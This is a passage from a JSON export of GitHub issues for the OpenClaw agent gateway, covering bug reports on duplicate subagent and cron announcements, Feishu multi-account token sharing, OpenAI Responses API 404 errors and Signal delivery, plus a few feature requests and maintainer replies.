\"Some task\",\n     cleanup: \"keep\"\n   })\n   ```\n\n3. Subagent completes and announces back to the channel\n\n## Expected Behavior\n\nOne announcement message delivered to the Discord channel.\n\n## Actual Behavior\n\nTwo identical (or near-identical) messages delivered approximately 0.3-1 seconds apart, with minor formatting differences:\n\n**Example duplicate:**\n```\nFirst delivery:\n\"Codex on it. Creating lib/ directory with shared modules...\"\n\nSecond delivery:\n\"Codex on it. Creating `lib/` directory with shared modules...\"\n```\n\nNote: The second delivery has backticks around `lib/` while the first doesn't.\n\n## Key Observations\n\n1. **Parent agent responses:** Single delivery (no duplication)\n2. **Subagent announcements:** Duplicate delivery\n3. **Pattern:** Duplication occurs when parent session is bound to the same channel the subagent announces to\n4. **Formatting differences:** Slight variations in markdown formatting between duplicates suggest two separate delivery paths\n\n## Configuration\n\n### Bindings\n```json\n{\n  \"bindings\": [\n    {\n      \"agentId\": \"main\",\n      \"match\": {\n        \"channel\": \"discord\",\n        \"peer\": {\n          \"kind\": \"channel\",\n          \"id\": \"<channel_id>\"\n        }\n      }\n    }\n  ]\n}\n```\n\n### Discord Guild Channels\n```json\n{\n  \"channels\": {\n    \"discord\": {\n      \"guilds\": {\n        \"<guild_id>\": {\n          \"channels\": {\n            \"*\": {\n              \"allow\": true,\n              \"requireMention\": false,\n              \"enabled\": true,\n              \"autoThread\": false\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n### Agents\n```json\n{\n  \"agents\": {\n    \"list\": [\n      {\n        \"id\": \"main\",\n        \"subagents\": {\n          \"allowAgents\": [\"codex\", \"researcher\"]\n        }\n      },\n      {\n        \"id\": \"codex\",\n        \"name\": \"Codex\",\n        \"model\": {\n          \"primary\": \"openai/gpt-5.3-codex\",\n          \"fallbacks\": [\"openai/gpt-5.2-codex\", \"anthropic/claude-sonnet-4-5\"]\n        }\n      }\n    ]\n  }\n}\n```\n\n## Hypothesis\n\nWhen a subagent announces completion, OpenClaw's delivery pipeline may be:\n1. Delivering via the subagent's natural delivery context (back to requester channel)\n2. **Also** delivering via the parent session's channel binding\n\nThis creates duplicate delivery when both paths resolve to the same Discord channel.\n\n## Attempted Fixes\n\n1. ✅ **Removed duplicate channel rules** — Initially suspected wildcard + specific channel rule overlap, but duplication persists even with only wildcard rule\n2. ❌ **Config.patch for channel rules** — `config.patch` merges objects but doesn't delete keys; manual `jq del()` was required\n3. ❌ **Multiple gateway restarts** — Issue persists across restarts\n\n## Related Issues / Releases\n\n- **#3549** — \"Discord: Duplicate messages being sent (double send)\" — Similar symptom but different root cause (streaming output duplication)\n- **v2026.2.3** — \"Cron: avoid duplicate deliveries when isolated runs send messages directly\" — Fixed cron-specific duplicates\n- **v2026.2.9** — \"Subagents/compaction: stabilize announce timing\" — Improved timing but doesn't address duplicate delivery\n\n## Workaround\n\nSubagents report back to parent agent instead of announcing directly to the channel. Parent then relays the message once.\n\n## Impact\n\n- Doubles perceived token cost (users see two messages)\n- User confusion (appears as if two agents responded)\n- Channel clutter\n\n## Additional Context\n\n- Issue does NOT occur when parent agent responds directly\n- Issue ONLY occurs when subagent announces to a channel where parent is also bound\n- Formatting differences suggest two separate code paths are executing delivery\n\n---\n\n**Version info:**\n```\nOpenClaw: 2026.2.9\nNode.js: v22.22.0\nPlatform: Docker (Unraid host)\n```\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13021",
      "createdAt": "2026-02-10T02:10:57Z",
      "updatedAt": "2026-02-11T06:58:08Z",
      "author": "troycorbinz",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3881060066,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13021#issuecomment-3881060066",
          "createdAt": "2026-02-10T22:23:16Z",
          "updatedAt": "2026-02-10T22:23:16Z",
          "author": "reverendrewind",
          "body": "## Confirming: Same issue on Telegram with cron jobs (v2026.2.9)\n\nSeeing the exact same duplicate delivery behavior on Telegram with cron `announce` mode on isolated sessions.\n\n### Environment\n- **OpenClaw:** 2026.2.9 (upgraded from 2026.2.6-3 today)\n- **Platform:** Ubuntu, bare metal (Tailscale serve)\n- **Channel:** Telegram\n- **Node.js:** v22.22.0\n\n### Reproduction\nAny cron job with `--announce --channel telegram --session isolated` delivers **2 messages** to Telegram per run:\n1. Cron agent's final text output (via `messageChannel=telegram` on the isolated session)\n2. Announce subagent's summary (via `messageChannel=telegram` on the main session)\n\n### Key observations\n- **Was not happening on v2026.2.6-3** — announce mode produced exactly 1 message before upgrading to v2026.2.9 today.\n- **Model-independent** — tested with 5 different models (Haiku 4.5, MiniMax M2.1, Qwen3 235B, Kimi K2 0905, DeepSeek V3). All produce 2 messages on v2026.2.9.\n- **`--no-deliver` (mode: \"none\")** gives 0 messages. No intermediate option exists — it's 2 or 0.\n- **`openclaw agent --deliver`** (one-shot, no announce subagent) correctly delivers 1 message — confirms the issue is specifically in the announce flow.\n\n### Gateway log evidence\nBoth the cron agent and the announce subagent run with `messageChannel=telegram`:\n```\nembedded run start: runId=<cron>   sessionId=<isolated> messageChannel=telegram  ← delivers message 1\nembedded run start: runId=<announce> sessionId=<main>    messageChannel=telegram  ← delivers message 2\n```\n\n### Likely cause\nAgree with OP's hypothesis. PR #11641 (\"share isolated announce flow\") appears to have regressed the fix from v2026.2.3 (\"avoid duplicate deliveries when isolated runs send messages directly\"). The shared flow now enables both the child agent and the announce subagent to deliver to the same channel independently.\n\n### Workaround\nUsing `openclaw agent --deliver --channel telegram` via systemd timers instead of cron announce mode for notification jobs."
        },
        {
          "id": 3882638426,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13021#issuecomment-3882638426",
          "createdAt": "2026-02-11T06:42:43Z",
          "updatedAt": "2026-02-11T06:42:43Z",
          "author": "reverendrewind",
          "body": "Worth noting this is effectively a **breaking regression for all cron users** on v2026.2.9:\n\n- `announce` is the **default delivery mode** for isolated cron jobs (set automatically by `openclaw cron add` when `--session isolated` is used)\n- The only alternative (`--no-deliver` / mode `\"none\"`) gives **0 messages** — there's no single-delivery option\n- This means every cron job that delivers to Telegram/Discord/Signal now sends duplicate messages after upgrading to v2026.2.9\n- Heartbeat ticks on the main session are also affected — the duplicate re-runs the heartbeat prompt, which can fail independently (we saw a MiniMax NaN crash on the duplicate run, delivering an error message to Telegram that wouldn't have existed without the bug)\n\nThe v2026.2.3 fix (\"avoid duplicate deliveries when isolated runs send messages directly\") worked correctly through v2026.2.6. The regression was introduced by PR #11641 in v2026.2.9."
        },
        {
          "id": 3882703828,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13021#issuecomment-3882703828",
          "createdAt": "2026-02-11T06:58:08Z",
          "updatedAt": "2026-02-11T06:58:08Z",
          "author": "reverendrewind",
          "body": "### Additional finding: Main session channel state is the trigger\n\nWe narrowed down the exact trigger condition:\n\n1. **Stop gateway, delete main session** (`agent:main:main` from `sessions.json`), restart\n2. **Trigger cron** → **1 message** (correct)\n3. **Send a Telegram DM** to the bot (establishing Telegram on the new main session)\n4. **Trigger same cron** → **2 messages** (duplicate)\n\nSo the duplicate only occurs once the main session has the delivery channel (Telegram/Discord) established from a prior interaction. The announce subagent runs on the main session, and its response gets forwarded through the session's established channel — in addition to the cron agent's own `messageChannel` delivery.\n\nOn v2026.2.6-3 this didn't happen because the announce flow was isolated from the main session's channel bindings. PR #11641 (\"share isolated announce flow\") in v2026.2.9 appears to have merged these paths."
        }
      ]
    },
    {
      "number": 13918,
      "title": "📱 Request iOS/Android TestFlight/Beta Access - @solfx",
      "body": "## GitHub Username\n\nsolfx\n\n## Email (for TestFlight)\n\nautismbug@gmail.com\n\n## Use Case\n\n- Running OpenClaw Gateway on macOS (Mac mini, ARM)\n- Want to use iOS device as a node for camera/location/notification capabilities\n- Interested in mobile control and device pairing features\n\n## Additional Context\n\n- Already running OpenClaw v2026.2.9 with Feishu channel integration\n- Familiar with the node pairing process\n- Happy to provide feedback and bug reports during alpha/beta\n\nThanks! 🦞",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13918",
      "createdAt": "2026-02-11T06:55:19Z",
      "updatedAt": "2026-02-11T06:55:38Z",
      "author": "solfx",
      "labels": [
        "r: testflight"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3882696919,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13918#issuecomment-3882696919",
          "createdAt": "2026-02-11T06:55:37Z",
          "updatedAt": "2026-02-11T06:55:37Z",
          "author": "openclaw-barnacle[bot]",
          "body": "Not available, build from source."
        }
      ]
    },
    {
      "number": 13916,
      "title": "[Bug]: Multi-Account Token Isolation Issue in Official Feishu Plugin # Bug 報告：官方飛書插件多賬號 Token 隔離問題",
      "body": "\n### Summary\n\nThe official Feishu plugin (`@openclaw/feishu`) has a critical bug in multi-account environments: all agents share the same Feishu Access Token (from the first account alphabetically), causing cross-account operations and permission errors.\n\n### Environment\n\n- **OpenClaw Version**: 2026.2.9\n- **Plugin**: `@openclaw/feishu` v2026.2.9\n- **Configuration**: 2 agents with 2 separate Feishu accounts\n\n### Configuration\n\n```json\n{\n  \"agents\": {\n    \"list\": [\n      { \"id\": \"agent-a\" },\n      { \"id\": \"agent-b\" }\n    ]\n  },\n  \"bindings\": [\n    {\n      \"agentId\": \"agent-a\",\n      \"match\": { \"channel\": \"feishu\", \"accountId\": \"feishu-account-a\" }\n    },\n    {\n      \"agentId\": \"agent-b\",\n      \"match\": { \"channel\": \"feishu\", \"accountId\": \"feishu-account-b\" }\n    }\n  ],\n  \"channels\": {\n    \"feishu\": {\n      \"accounts\": {\n        \"feishu-account-a\": {\n          \"appId\": \"cli_xxxxxxxxxxxxxxxx\",\n          \"appSecret\": \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n        },\n        \"feishu-account-b\": {\n          \"appId\": \"cli_yyyyyyyyyyyyyyyy\",\n          \"appSecret\": \"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\"\n        }\n      }\n    }\n  }\n}\n```\n\n### Problem\n\nWhen `agent-a` calls Feishu tools (e.g., `feishu_doc` to create a document), it uses `feishu-account-b`'s Access Token instead of its own `feishu-account-a` token.\n\n**Expected**: Document created in agent-a's workspace (`workspace-a.feishu.cn`)  \n**Actual**: Document created in agent-b's workspace (`workspace-b.feishu.cn`)\n\n### Root Cause\n\nThe plugin registers tools using only the **first account** (alphabetically):\n\n```typescript\n// File: src/docx.ts\nexport function registerFeishuDocTools(api: OpenClawPluginApi) {\n  const accounts = listEnabledFeishuAccounts(api.config);\n  \n  // ❌ BUG: Always uses first account\n  const firstAccount = accounts[0];  // \"feishu-account-a\" (alphabetically first)\n  \n  // ❌ BUG: getClient always returns first account's client\n  const getClient = () => createFeishuClient(firstAccount);\n  \n  api.registerTool({\n    name: \"feishu_doc\",\n    async execute(_toolCallId, params) {\n      // ❌ BUG: All agents use the same client\n      const client = getClient();\n      // ...\n    }\n  });\n}\n```\n\n### Impact\n\n1. **Cross-account operations**: agent-a creates documents in agent-b's workspace\n2. **Permission errors**: agent-a gets 403 errors when accessing agent-a's documents (using agent-b's token)\n3. **No identity tracking**: All operations appear to be from agent-b\n4. **Affects all tools**: `feishu_doc`, `feishu_wiki`, `feishu_drive`, `feishu_bitable`, `feishu_app_scopes`\n\n### Proposed Fix\n\nTools should use the account associated with the current session:\n\n```typescript\nexport function registerFeishuDocTools(api: OpenClawPluginApi) {\n  const accounts = listEnabledFeishuAccounts(api.config);\n  \n  api.registerTool({\n    name: \"feishu_doc\",\n    async execute(toolCallId, params, context) {\n      // ✅ FIX: Get accountId from session context\n      const accountId = context?.session?.accountId || accounts[0].accountId;\n      const account = accounts.find(a => a.accountId === accountId) || accounts[0];\n      const client = createFeishuClient(account);\n      // ...\n    }\n  });\n}\n```\n\n**Requirements**:\n1. Plugin SDK needs to pass session context to tool `execute()` function\n2. Context should include `session.accountId` from the binding\n3. All channel plugins should support this pattern\n\n### Workarounds\n\n### Steps to Reproduce\n\n1. Configure 2 agents with 2 Feishu accounts (as shown above)\n2. Use agent-a to create a Feishu document via `feishu_doc` tool\n3. Check which workspace the document appears in\n4. Result: Document appears in agent-b's workspace (wrong account)\n\n### Expected Behavior\n\n- agent-a should use feishu-account-a's token\n- agent-b should use feishu-account-b's token\n- Each agent's operations should appear in their own workspace\n\n### Additional Context\n\nThis is a critical bug for multi-tenant or multi-user deployments where different agents need to operate with different Feishu identities.\n\n---\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13916",
      "createdAt": "2026-02-11T06:52:06Z",
      "updatedAt": "2026-02-11T06:54:41Z",
      "author": "darkchaox",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": []
    },
    {
      "number": 12885,
      "title": "OpenAI Responses API: Stale previous_response_id causes 404 'Item not found' errors",
      "body": "## Problem Description\n\nOpenClaw sessions intermittently fail with HTTP 404 errors when using OpenAI models via the Responses API:\n\n```\nHTTP 404: Item with id 'rs_...' not found. Items are not persisted when `store` is set to false. Try again with `store` set to true, or remove this item from your input.\n```\n\n### Error Pattern\n- Error IDs follow pattern: `rs_[32-hex-chars]` (reasoning item IDs)\n- Examples: `rs_0b1d...f18`, `rs_0686...ec6`, etc.\n- Frequency: Multiple times per day during active cron jobs\n\n### Correlation with User Activity\n**Notable observation:** This issue began manifesting more prominently around early February 2026, coinciding with increased session activity and tool call frequency. This suggests a potential interaction between:\n- Session volume/load\n- Tool call frequency (multiple MCP tools)\n- Session lifecycle management\n\n### Environment\n- **OpenClaw Version:** 2026.2.9 (updated from 2026.2.6-3)\n- **Affected Models:** `openai/gpt-5.1-codex`, `openai/gpt-5.2-codex` (likely all OpenAI Responses API models)\n- **Session Types:** Both main sessions and cron-triggered isolated sessions\n- **Frequency:** Multiple times per day (every 2-4 hours during active cron jobs)\n\n## Root Cause Analysis\n\n### Primary Issue\nWhen using the OpenAI Responses API with multi-turn conversations:\n\n1. **State Mismatch:** OpenClaw chains `previous_response_id` across turns to maintain conversation context\n2. **Server-Side Persistence:** The Responses API only persists items when `store: true` is set (or defaults)\n3. **Stale References:** When `store` is false/unset, reasoning items (`rs_...` IDs) are not persisted server-side\n4. **404 Error:** Subsequent requests referencing these IDs fail because OpenAI cannot find the items\n\n### Evidence from Similar Issues\nThis is a known pattern affecting multiple projects:\n- Vercel AI SDK issue #7543\n- OpenCode issue #4426\n- OpenAI Agents Python issue #2020\n\n## Required Fix\n\n### Option 1: Enable Server-Side Storage (Recommended)\nEnsure `store: true` is explicitly set (or remove any `store: false` override) when using multi-turn conversations with the Responses API.\n\n### Option 2: Robust previous_response_id Handling\nOnly persist `previous_response_id` in session state **after** a fully successful response:\n- Persist after `status: \"completed\"`\n- Do NOT persist on partial/streamed/cancelled turns\n- Do NOT persist if the response errors\n\n### Option 3: Per-Session Self-Heal\nOn 404 \"Item not found\" errors:\n1. Detect the specific error pattern\n2. Clear that session's `previous_response_id`\n3. Retry the request once without the stale reference\n4. Only escalate to error if retry fails\n\nThis would prevent full gateway restarts for stale state.\n\n## Current Workaround\n\nUntil the provider fix is deployed:\n\n1. **Guardrail Monitoring:** Cron job runs every 2 hours, detects new errors via log scanning, dedupes via watermark file\n2. **Break-Glass Recovery:** Manual gateway restart clears all corrupted session state\n3. **Monitoring Script:** Custom guardrail script\n\n## Code Locations to Investigate\n\nBased on analysis of dist files:\n- `gateway-cli-*.js`: `CreateResponseBodySchema` includes `store` and `previous_response_id`\n- `loader-*.js`: `isOpenAIResponsesApi` check\n- Provider implementation where `client.responses.create()` is called\n\n## Request\n\nPlease investigate and implement one of the fix options above. The issue significantly impacts cron jobs and long-running sessions using OpenAI models.\n\nHappy to provide additional logs or test any proposed fixes.\n",
      "state": "closed",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/12885",
      "createdAt": "2026-02-09T21:14:20Z",
      "updatedAt": "2026-02-11T06:48:50Z",
      "author": "Realowg",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway"
        ]
      },
      "commentsData": [
        {
          "id": 3882667415,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/12885#issuecomment-3882667415",
          "createdAt": "2026-02-11T06:48:49Z",
          "updatedAt": "2026-02-11T06:48:49Z",
          "author": "Realowg",
          "body": "Resolved via configuration fix:\n\n**Root cause:** Stale main session chain was reintroducing an invalid store key after restarts, causing crash-loop on OpenAI 404 responses.\n\n**Fix applied:** Killed the stale session chain; bot now stable with no restart storm.\n\n**Status:** Gateway running clean for 10+ minutes. Per-session rs_* 404s on stale previous_response_id are acceptable operational residue — the crash-loop was the critical issue.\n\nClosing as the immediate availability problem is resolved. The underlying auto-heal behavior (clearing previous_response_id on 404) can be revisited later if the 404 noise becomes problematic."
        }
      ]
    },
    {
      "number": 13915,
      "title": "Bug: Cron announce delivery target not passed to Signal send",
      "body": "## Bug Description\n\nCron jobs with `delivery.mode: \"announce\"` fail to deliver to Signal because the `delivery.to` field is not being passed to the Signal send function. The field is correctly configured in the job but arrives empty at Signal target validation.\n\n## Reproduction Steps\n\n1. Create a cron job with announce delivery:\n```json\n{\n  \"name\": \"Test Job\",\n  \"schedule\": { \"kind\": \"at\", \"at\": \"2026-02-11T04:00:00Z\" },\n  \"sessionTarget\": \"isolated\",\n  \"payload\": {\n    \"kind\": \"agentTurn\",\n    \"message\": \"Test message\"\n  },\n  \"delivery\": {\n    \"mode\": \"announce\",\n    \"channel\": \"signal\",\n    \"to\": \"+15551234567\",\n    \"bestEffort\": true\n  }\n}\n```\n\n2. Wait for job execution or run manually: `openclaw cron run <job-id>`\n\n3. Observe error in logs:\n```\nError: Delivering to Signal requires target <E.164|uuid:ID|group:ID|signal:group:ID|signal:+E.164>\nannounce queue drain failed for agent:main:cron:<job-id>\n```\n\n## Expected Behavior\n\nThe `delivery.to` value (`\"+15551234567\"`) should be passed to the Signal send function and the message should be delivered successfully.\n\n## Actual Behavior\n\nThe Signal send function receives an empty/undefined target, causing the \"missing target\" validation error.\n\n## Verification\n\nDirect message send works correctly:\n```bash\nopenclaw message send --channel signal --target \"+15551234567\" --message \"test\"\n# ✅ Sent via Signal. Message ID: ...\n```\n\nThis confirms:\n- Signal integration is working\n- Target format is correct\n- The issue is specifically in the cron announce delivery pipeline\n\n## Environment\n\n- **OpenClaw Version**: 2026.2.6-3 (commit 85ed6c7)\n- **Platform**: Debian 12 (VPS)\n- **Channel**: Signal (signal-cli 0.13.24)\n- **Config**: Gateway bind=loopback, systemd service\n\n## Impact\n\n- All cron jobs with announce delivery are non-functional\n- Daily briefings and scheduled notifications cannot be delivered\n- Affects production deployments relying on automated notifications\n\n## Additional Context\n\nThe `delivery.to` field is defined as optional in the schema (`CronDeliverySchema` in `src/gateway/protocol/schema/cron.ts`), but when provided, it should be passed through to the channel send function.\n\nThe issue appears to be in the announce delivery flow where the delivery config from the cron job is not correctly mapped to the outbound message parameters.\n\n## Workaround\n\nUntil fixed, use `sessionTarget: \"main\"` instead of `\"isolated\"` to post messages directly to the main session, which then delivers via the normal message flow.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13915",
      "createdAt": "2026-02-11T06:46:43Z",
      "updatedAt": "2026-02-11T06:46:43Z",
      "author": "HendrikHarren",
      "labels": [],
      "taxonomy": {
        "channels": [
          "signal"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 4862,
      "title": "[Bug]: Clawd bot can't use it's own cron tool, claims documentation doesn't explain it.",
      "body": "## Summary\nI'm trying to get my bot to schedule social media messages. It's giving me an error that it can't figure out the formatting for the built in cron tool. \n\n## Steps to reproduce\n1. Schedule X post\n2. Get error\n\n## Expected behavior\nI expected moltbot to use it's cron job tool\n\n## Actual behavior\nIt gives me errors saying it can't figure out the formate of the cron.add call\n\n## Environment\n- Clawdbot version: 2026.1.24-3\n- OS: Mac Intel\n- Install method (pnpm/npx/docker/etc): curl -fsSL https://openclaw.ai/install.sh | bash\nIt's installed in an nvm directory in node 22\n\n## Logs or screenshots\n\n-------From Moltbot------\nI see the problem. There isn't a cron.md file directly in the docs/tools/ directory.\n\nHowever, based on the file names, it's possible that documentation for cron jobs is embedded within a more general tool or concepts file. \"index.md (http://index.md/)\" is a possibility. \"agent-send.md (http://agent-send.md/)\" or \"subagents.md (http://subagents.md/)\" might also have relevant information if cron jobs are considered a form of agent interaction.\n\nI will start by reading index.md in the docs/tools/ directory, as it's often a good starting point for overviews. If that doesn't yield the answer, I can then explore other relevant files or try to read the main README.md for the entire Clawdbot project for general configuration guidelines.\n\nI've reviewed the general tools documentation, and unfortunately, it refers to the cron.add RPC schema without actually providing it. This means I still don't have the precise structure required for the job parameter to schedule the evening post.\n\n------End from Moltbot-----\n\nSo I have fallen back to the system cron tool which gives me all kinds of permissions errors. I would like to be able to use the buitin cron tool if possible. \n\n\n",
      "state": "closed",
      "comments": 5,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862",
      "createdAt": "2026-01-30T19:30:11Z",
      "updatedAt": "2026-02-11T06:40:03Z",
      "author": "nickjuntilla",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "docker"
        ],
        "components": [
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3837299582,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862#issuecomment-3837299582",
          "createdAt": "2026-02-02T20:11:18Z",
          "updatedAt": "2026-02-02T20:11:18Z",
          "author": "tril0byte",
          "body": "I'm having a very similar issue, I put some notes into the PR with logs"
        },
        {
          "id": 3837522547,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862#issuecomment-3837522547",
          "createdAt": "2026-02-02T21:39:43Z",
          "updatedAt": "2026-02-02T21:39:43Z",
          "author": "tril0byte",
          "body": "looks like the bot's able to use the builtin cron skill but only after reading the SKILL.md from the skills/ez-cronjob skill which seems to been from clawdhub. I didn't install it, so I think the clawdbot wizard did it. The openclaw bot says this skill's not available in clawhub. According to its README.md, it's from https://github.com/ProMadGenius/clawdbot-skills"
        },
        {
          "id": 3839789511,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862#issuecomment-3839789511",
          "createdAt": "2026-02-03T08:19:50Z",
          "updatedAt": "2026-02-03T08:19:50Z",
          "author": "unchainedio",
          "body": "## Additional Report: Cron Scheduler Not Calculating nextWakeAtMs\n\nI'm experiencing a related cron issue where jobs are registered but never execute.\n\n### Environment\n- OpenClaw version: 2026.2.1 (git: 1ee57cf7)\n- OS: Ubuntu 22.04 LTS\n- Install method: git clone\n- Node: v22.22.0\n\n### Problem\n shows  — the scheduler starts but never calculates wake times, so no jobs ever run.\n\n\n\n### Jobs Configured\n- 2x  interval jobs (5 min)\n- 2x  expression jobs (daily at 8am/9am Cairo)\n- 1x test  job (60 sec) — added for debugging\n- All show in list, none execute\n\n### Log Output\n\n\n### What I Tried\n1. ✅ Added explicit  section to config\n2. ✅ Restarted gateway multiple times\n3. ✅ Removed & re-added jobs\n4. ✅ Updated to latest git (was 68 commits behind)\n5. ✅ Added simple  interval test job — still \n\n### Expected\n should calculate the next execution time based on job schedules.\n\n### Actual\nAlways , jobs never trigger.\n\nRelated to cron not working properly — possibly same root cause?"
        },
        {
          "id": 3882022387,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862#issuecomment-3882022387",
          "createdAt": "2026-02-11T04:13:26Z",
          "updatedAt": "2026-02-11T04:13:26Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3882626275,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/4862#issuecomment-3882626275",
          "createdAt": "2026-02-11T06:40:03Z",
          "updatedAt": "2026-02-11T06:40:03Z",
          "author": "nickjuntilla",
          "body": "This was fixed for me by upgrading to latest openclaw @ 2026.2.9"
        }
      ]
    },
    {
      "number": 13317,
      "title": "[Bug]: Ghost \"scheduled reminder\" notifications with empty payload",
      "body": "## Summary\n\nThe OpenClaw runtime periodically sends system messages claiming \"A scheduled reminder has been triggered\" but never includes any actual reminder content. The message template fires without payload data, creating ghost notifications.\n\n## Steps to reproduce\n\n1. Run OpenClaw gateway with standard configuration\n2. Wait for periodic system messages\n3. Observe system message: \"A scheduled reminder has been triggered. The reminder message is shown in the system messages above.\"\n4. Check system messages above — no reminder content exists\n\n## Expected behavior\n\nEither a real reminder with actionable content should appear, OR no notification should fire if there's nothing to remind about.\n\n## Actual behavior\n\nEmpty reminder notification fires with no payload. The message claims content is \"shown in the system messages above\" but no such content exists.\n\n## Environment\n\n- Clawdbot version: 2026.2.9\n- OS: macOS\n- Install method: npm\n\n## Logs or screenshots\n\nNo \"reminder\" entries appear in gateway logs despite notifications firing:\n\n\n$ grep -i \"reminder\" ~/.openclaw/logs/gateway.log\n(no results)\n\n\nAll configured cron jobs run normally and are unrelated to these notifications. The ghost messages appear to originate from within the OpenClaw runtime itself.",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13317",
      "createdAt": "2026-02-10T10:14:21Z",
      "updatedAt": "2026-02-11T06:36:43Z",
      "author": "jkohlbach",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3877302703,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13317#issuecomment-3877302703",
          "createdAt": "2026-02-10T12:30:03Z",
          "updatedAt": "2026-02-10T12:30:03Z",
          "author": "jkohlbach",
          "body": "The symptom of this is your agent saying stuff like:\n\n\"I don't see a reminder message in the system context above. Could you share the reminder text so I can relay it helpfully to [user]?\""
        },
        {
          "id": 3882612549,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13317#issuecomment-3882612549",
          "createdAt": "2026-02-11T06:36:24Z",
          "updatedAt": "2026-02-11T06:36:43Z",
          "author": "jkohlbach",
          "body": "The \"phantom empty reminder\" is the heartbeat firing but failing to include the prompt content due to an invalid model.\n\nI had removed the model that was previously being used by the heartbeat from the models in the OpenClaw config. \n\nThe heartbeat still triggers but the content of the message is empty, thoroughly confusing my agent. I'm closing this ticket as the issue is solved by adjusting config to use the correct valid model for heartbeats."
        }
      ]
    },
    {
      "number": 2257,
      "title": "Feature Request: Add local uninstall command to clawdhub CLI",
      "body": "The clawdhub CLI has a delete command that removes skills from the registry (requiring ownership), but no command exists to simply uninstall/remove a skill from your local machine. This creates user confusion.\n\nRequest: Add a clawdhub uninstall <skill> command that removes the skill folder from ~/.clawdbot/skills/ without requiring registry authentication.\n\nWorkaround currently: rm -rf ~/.clawdbot/skills/<skill>",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/2257",
      "createdAt": "2026-01-26T15:57:04Z",
      "updatedAt": "2026-02-11T06:29:51Z",
      "author": "EyeSeeThru",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3817628825,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2257#issuecomment-3817628825",
          "createdAt": "2026-01-29T13:14:40Z",
          "updatedAt": "2026-01-29T13:14:40Z",
          "author": "sebslight",
          "body": "Closing this issue due to inactivity (no updates in 3+ days). If this is still relevant, please feel free to reopen with any additional context or updates.\n\nThanks for taking the time to report this!"
        },
        {
          "id": 3882580303,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/2257#issuecomment-3882580303",
          "createdAt": "2026-02-11T06:29:51Z",
          "updatedAt": "2026-02-11T06:29:51Z",
          "author": "sweihub",
          "body": "`clawhub install` to a skill,  but no `clawhub uninstall` to remove a skill from local disk, it's confusing, I have to `rm -rf ~/.openclaw/workspace/skills/<SKILL>`"
        }
      ]
    },
    {
      "number": 13911,
      "title": "Feature: per-channel announce suppression for sub-agents",
      "body": "## Problem\n\nWhen the main agent spawns a sub-agent from a Telegram session, the completion announcement always routes back to Telegram. There's no config option to suppress or reroute sub-agent announces per channel.\n\nCurrent workaround: the main agent responds with `NO_REPLY` behaviorally, but this depends on the agent 'remembering' to do it — not enforceable structurally.\n\n## Current config coverage\n- `heartbeat.target` ✅ can redirect heartbeats away from a channel\n- `heartbeat.showOk/showAlerts` ✅ suppresses heartbeat noise\n- `tools.subagents.tools.deny` ✅ prevents sub-agents from using message/tts\n- **Sub-agent announce routing** ❌ no config exists\n\n## Proposed solution\n\nAdd a config option like:\n\n```json5\n{\n  channels: {\n    telegram: {\n      subagentAnnounce: \"suppress\" // or \"none\" | \"quiet\"\n    }\n  }\n}\n```\n\nOr a more general `announce.channels.deny` list:\n\n```json5\n{\n  agents: {\n    defaults: {\n      subagents: {\n        announce: {\n          denyChannels: [\"telegram\"]\n        }\n      }\n    }\n  }\n}\n```\n\nThis would let users keep interactive Telegram replies working while preventing automated sub-agent announcements from cluttering the chat.\n\n## Context\nThe announce flow is in `subagent-announce.ts` → `runSubagentAnnounceFlow()` which calls `sendAnnounce()` with `deliver: true` hardcoded, using the parent session's delivery context. A channel check before delivery would solve this cleanly.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13911",
